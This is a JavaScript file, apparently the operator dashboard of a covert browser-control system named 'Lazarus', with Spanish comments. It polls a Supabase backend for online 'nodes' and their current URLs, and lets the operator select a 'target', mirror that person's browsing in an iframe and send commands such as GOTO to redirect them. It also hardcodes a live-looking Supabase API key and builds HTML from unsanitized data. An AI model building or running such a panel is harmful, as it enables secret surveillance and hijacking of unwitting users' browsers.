const SB_URL = "https://gmvczheriaqouwynfdyv.supabase.co";
const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdtdmN6aGVyaWFxb3V3eW5mZHl2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA0MTM1OTQsImV4cCI6MjA4NTk4OTU5NH0.22wbgR33dCQ1vfB_EdWpxGY5w811_jsf1dqbU1P6dQs";

let currentTargetID = null;
let lastUrlSeen = "";

async function syncLazarusSystem() {
    try {
        // Consultamos los logs de los últimos 5 minutos para saber quién está online realmente
        const cincoMinutosAgo = new Date(Date.now() - 5 * 60000).toISOString();
        
        const response = await fetch(`${SB_URL}/rest/v1/logs?select=*&timestamp=gte.${cincoMinutosAgo}&order=timestamp.desc`, {
            headers: { 'apikey': SB_KEY, 'Authorization': `Bearer ${SB_KEY}` }
        });
        const logs = await response.json();

        if (logs.length === 0) {
            document.getElementById('nodes').innerHTML = "<p style='color:#555; padding:20px;'>Esperando conexión de nodos...</p>";
            document.getElementById('user-count').innerText = "0";
            return;
        }

        // Agrupar por ID único (solo el log más reciente de cada uno)
        const activeNodes = new Map();
        logs.forEach(log => {
            if (!activeNodes.has(log.usuario_id)) {
                activeNodes.set(log.usuario_id, log);
            }
        });

        renderList(activeNodes);
        updateMirror(activeNodes);

    } catch (error) {
        console.error("Error de sincronización:", error);
    }
}

function renderList(nodesMap) {
    const listContainer = document.getElementById('nodes');
    const nodes = Array.from(nodesMap.values());
    document.getElementById('user-count').innerText = nodes.length;

    listContainer.innerHTML = nodes.map(node => `
        <div class="user-node ${currentTargetID === node.usuario_id ? 'active' : ''}" 
             onclick="setTarget('${node.usuario_id}')">
            <div class="status-pulse"></div>
            <b>${node.usuario_id}</b><br>
            <small style="font-size:9px; color:rgba(0,255,65,0.5)">${node.url_actual.substring(0, 30)}...</small>
        </div>
    `).join('');
}

function updateMirror(nodesMap) {
    if (!currentTargetID) return;
    const data = nodesMap.get(currentTargetID);
    if (data && data.url_actual !== lastUrlSeen) {
        lastUrlSeen = data.url_actual;
        document.getElementById('monitor').src = data.url_actual;
        document.getElementById('current-url').innerText = "Viendo: " + data.url_actual;
    }
}

function setTarget(id) {
    currentTargetID = id;
    lastUrlSeen = ""; // Reset para forzar recarga de pantalla
    document.getElementById('target-info').innerText = "CONTROL DIRECTO: " + id;
    syncLazarusSystem();
}

async function execute(command) {
    if (!currentTargetID) return alert("Selecciona un usuario de la lista izquierda.");
    const urlInput = document.getElementById('target-url').value;

    // Borrar órdenes previas
    await fetch(`${SB_URL}/rest/v1/ordenes?usuario_id=eq.${currentTargetID}`, {
        method: 'DELETE', headers: { 'apikey': SB_KEY }
    });

    // Nueva orden
    await fetch(`${SB_URL}/rest/v1/ordenes`, {
        method: 'POST',
        headers: { 'apikey': SB_KEY, 'Content-Type': 'application/json' },
        body: JSON.stringify({
            usuario_id: currentTargetID,
            orden: command,
            contenido: command === 'GOTO' ? urlInput : '',
            activa: true
        })
    });
    alert("Comando " + command + " enviado a " + currentTargetID);
}

setInterval(syncLazarusSystem, 2000);
syncLazarusSystem();
